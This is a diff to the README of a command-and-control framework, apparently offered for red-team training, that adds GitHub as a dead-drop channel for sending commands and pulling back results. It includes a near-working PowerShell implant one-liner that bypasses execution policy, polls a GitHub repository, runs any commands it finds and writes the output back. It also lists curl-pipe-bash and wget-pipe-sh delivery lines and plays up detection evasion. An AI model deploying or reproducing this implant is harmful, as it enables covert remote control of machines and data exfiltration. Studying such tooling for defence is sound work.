@@ -2,7 +2,7 @@
 
 ## 📋 Executive Summary
 
-**ZeroTrust** (UI name: **ZeroTrace**) is a sophisticated command-and-control (C2) framework engineered for educational red teaming simulations and advanced persistent threat (APT) research. The platform combines **covert channel communication**, **federated learning-based command delivery**, and **Living-off-the-Land Binaries (LOLBINs)** to demonstrate advanced threat methodologies while maintaining educational integrity and security research compliance.
+**ZeroTrust** (UI name: **ZeroTrace**) is a sophisticated command-and-control (C2) framework engineered for educational red teaming simulations and advanced persistent threat (APT) research. The platform combines **covert channel communication** (including **GitHub as a dead-drop C2 channel**), **federated learning-based command delivery**, and **Living-off-the-Land Binaries (LOLBINs)** to demonstrate advanced threat methodologies while maintaining educational integrity and security research compliance.
 
 ---
 
@@ -58,7 +58,95 @@ The framework uses distributed machine learning rounds as a covert C2 channel:
 
 **Key Advantage**: ML traffic is legitimate and expected in enterprise networks, making it virtually undetectable.
 
-### 4. **AI-Powered Natural Language Command Translation**
+### 4. **GitHub as Covert Channel (Dead Drop C2)**
+
+ZeroTrust uses a **GitHub repository as a covert dead-drop** for command delivery and result exfiltration. Because GitHub API traffic is indistinguishable from normal developer activity, this channel is highly resilient to network-level detection.
+
+**How the GitHub Covert Channel Works:**
+
+```
+Operator (Dashboard)
+    │
+    ▼  POST /execute-command
+Flask Backend
+    │
+    ▼  GitHub API PUT  ──►  commands/{bot_uuid}.txt  (in operator's GitHub repo)
+                                     │
+                        Bot polls every 5 seconds
+                        GET /repos/{owner}/{repo}/contents/commands/{uuid}.txt
+                                     │
+                                     ▼
+                        Execute PowerShell payload locally
+                        Write output → results/{bot_uuid}.txt via GitHub API
+                        Clear commands/{bot_uuid}.txt (dead-drop reset)
+                                     │
+Flask Backend  ◄──  GitHub API GET  results/{bot_uuid}.txt
+    │
+    ▼
+Operator sees results in Dashboard
+```
+
+**Key Properties:**
+- **No direct connection** between operator and bot — GitHub acts as intermediary
+- **Legitimate-looking traffic** — all requests are standard GitHub REST API calls (`api.github.com`)
+- **Self-clearing** — bot clears the commands file after execution to avoid re-execution
+- **SHA-based conflict prevention** — GitHub's blob SHA is tracked to ensure atomic file updates
+- **PAT-based authentication** — all API calls authenticated with a Personal Access Token (PAT)
+
+**Required GitHub Setup:**
+
+| Setting | Description | Where to Configure |
+|---------|-------------|-------------------|
+| **Personal Access Token (PAT)** | Token with `repo` scope | Dashboard → Configuration → GitHub Integration |
+| **GitHub Username** | Repository owner | Dashboard → Configuration → GitHub Integration |
+| **Repository Name** | Repo to use as dead drop (must exist) | Dashboard → Configuration → GitHub Integration |
+| **Default Branch** | Branch for file operations (`main` / `master`) | Dashboard → Configuration → GitHub Integration |
+
+**Agent Factory — GitHub Transport Channel:**
+
+When building an agent in **Agent Factory**, selecting `GitHub` as the transport channel generates a self-contained PowerShell one-liner that embeds the PAT, repo coordinates, and bot UUID:
+
+> ⚠️ **Security Note:** The generated agent embeds the PAT in plaintext within the command string. This means the token is visible in process listings, command history, and memory dumps on the target machine. This is an inherent trade-off of the dead-drop approach and is documented here for educational awareness. In a controlled lab environment, use a scoped, short-lived PAT with minimal permissions and rotate it after each engagement.
+
+```powershell
+# Generated one-liner (Windows — PowerShell LOLBin)
+powershell -ExecutionPolicy Bypass -Command "
+  $RepoOwner='<github_username>';
+  $RepoName='<repo>';
+  $BotID='<uuid>';
+  $PAT='<pat>';
+  $AuthHeader=@{Authorization=\"token $PAT\"};
+  $CmdUrl=\"https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt\";
+  $ResUrl=\"https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt\";
+  while($true){
+    $resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;
+    $cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split \"\`n\";
+    $cmdSha=$resp.sha;
+    $results=@();
+    foreach($c in $cmds){
+      if(-not [string]::IsNullOrWhiteSpace($c)){
+        $results+=(&([ScriptBlock]::Create($c)) | Out-String)
+      }
+    };
+    # Write results back and clear commands
+    ...
+    Start-Sleep -Seconds 5
+  }
+"
+```
+
+**Supported Platforms via GitHub Channel:**
+
+| Platform | Delivery Method |
+|----------|----------------|
+| **Windows** | `powershell -ExecutionPolicy Bypass` (PowerShell LOLBin) |
+| **Linux** | `curl -s <raw_url> \| bash` |
+| **macOS** | `curl -s <raw_url> \| bash` |
+| **Android** | `wget -qO- <raw_url> \| sh` |
+
+---
+
+### 5. **AI-Powered Natural Language Command Translation**
 
 The dashboard leverages **Groq API (GPT-OSS-120B)** to automatically generate Windows commands:
 
@@ -95,6 +183,7 @@ Result: Network reconnaissance data returned to dashboard
 | **AI Integration** | Groq API (GPT-OSS-120B) | Natural language to command translation |
 | **UI Framework** | Tailwind CSS 4 | Modern responsive dashboard design |
 | **Database** | MongoDB (via pymongo 4.6.3) | Bot registry & command/result storage |
+| **Covert Channel** | GitHub REST API v3 | Dead-drop C2 via `commands/` and `results/` files |
 
 ### Communication Architecture
 
@@ -400,8 +489,55 @@ python main.py        # Starts Flask server on http://localhost:5000
   -Lr 0.05
 ```
 
+### GitHub Repository Setup (Covert Channel)
+
+Before building your first agent, configure a GitHub repository to serve as the C2 dead-drop:
+
+1. **Create a new GitHub repository** (e.g., `c2-responder`) — can be private.
+2. **Generate a Personal Access Token (PAT)** with the `repo` scope at `GitHub → Settings → Developer Settings → Personal Access Tokens`.
+3. **Configure credentials in the dashboard** at `/config → GitHub Integration`:
+   - Personal Access Token (PAT)
+   - GitHub Username
+   - Repository Name
+   - Default Branch (`main` or `master`)
+
+The backend will automatically create `commands/<uuid>.txt` and `results/<uuid>.txt` files in the repository when a new agent is registered.
+
 ### AI Assistant Setup
 See [AI_ASSISTANT_SETUP.md](./AI_ASSISTANT_SETUP.md) for detailed Groq API configuration and example queries.
+
+---
+
+## ⚙️ GitHub Actions Workflows
+
+ZeroTrust uses the following active GitHub Actions workflows to maintain code quality and dependency hygiene:
+
+| Workflow | Trigger | Purpose |
+|----------|---------|---------|
+| **Copilot Code Review** | Pull requests | Automated AI-powered code review on every PR using GitHub Copilot |
+| **Copilot Coding Agent** | Issues / manual dispatch | Delegates code tasks to the GitHub Copilot coding agent |
+| **Dependabot Updates** | Scheduled | Automated dependency vulnerability scanning and update PRs |
+
+### Workflow Details
+
+**1. Copilot Code Review (`copilot-pull-request-reviewer`)**
+- Runs on every pull request
+- Uses GitHub Copilot to review changed files and suggest improvements
+- Helps enforce security and code quality standards before merge
+
+**2. Copilot Coding Agent (`copilot-swe-agent`)**
+- Triggered via GitHub Issues labeled for Copilot or through manual workflow dispatch
+- Allows the Copilot SWE agent to autonomously implement code changes
+- Useful for automated feature development and bug fixes in a sandboxed environment
+
+**3. Dependabot Updates (`dependabot-updates`)**
+- Runs on a schedule to scan `package.json` (npm) and `requirements.txt` (pip) for known CVEs
+- Automatically opens pull requests when updated dependency versions are available
+- Keeps the framework's dependency chain free of publicly disclosed vulnerabilities
+
+> **Tip:** All three workflows are visible under the **Actions** tab in the GitHub repository. The Dependabot workflow uses a dynamic path — you can monitor its badge at:
+>
+> [![Dependabot Updates](https://github.com/HackWidMaddy/ZeroTrust/actions/workflows/dependabot/dependabot-updates/badge.svg)](https://github.com/HackWidMaddy/ZeroTrust/actions)
 
 ---
 
@@ -431,18 +567,19 @@ See [AI_ASSISTANT_SETUP.md](./AI_ASSISTANT_SETUP.md) for detailed Groq API confi
 
 ## 🔑 Key Takeaways
 
-1. **Covert Channel Innovation**: Federated learning as C2 communication vector
+1. **Covert Channel Innovation**: Federated learning AND GitHub dead-drop as dual C2 communication vectors
 2. **LOLBIN Abuse**: System binary exploitation for payload delivery
 3. **Detection Evasion**: Multi-layer obfuscation and behavioral mimicry
 4. **AI-Powered Operations**: Natural language command generation
 5. **Defense Mechanisms**: Educational demonstration of persistence techniques
 6. **Security Research Value**: Advances blue team and detection capabilities
+7. **GitHub-as-C2**: Demonstrates how legitimate cloud services (GitHub API) can be abused as covert channels
 
 ---
 
 ## 📝 Summary
 
-ZeroTrust represents a **next-generation C2 framework** combining cutting-edge threat techniques (federated learning, LOLBIN abuse, covert channels) with **educational integrity** and **security research applications**. The framework demonstrates how modern threat actors maintain persistence while evading detection, serving as a critical tool for red team training, penetration testing, and blue team defense research.
+ZeroTrust represents a **next-generation C2 framework** combining cutting-edge threat techniques (federated learning, **GitHub dead-drop channels**, LOLBIN abuse, covert channels) with **educational integrity** and **security research applications**. The framework demonstrates how modern threat actors maintain persistence while evading detection — including the novel abuse of trusted cloud services like GitHub as covert C2 channels — serving as a critical tool for red team training, penetration testing, and blue team defense research.
 
 The anti-prevention mechanisms demonstrate the **adversarial arms race** between offense and defense, providing valuable insights for both attackers seeking to understand evasion techniques and defenders seeking to detect and mitigate advanced threats.
 
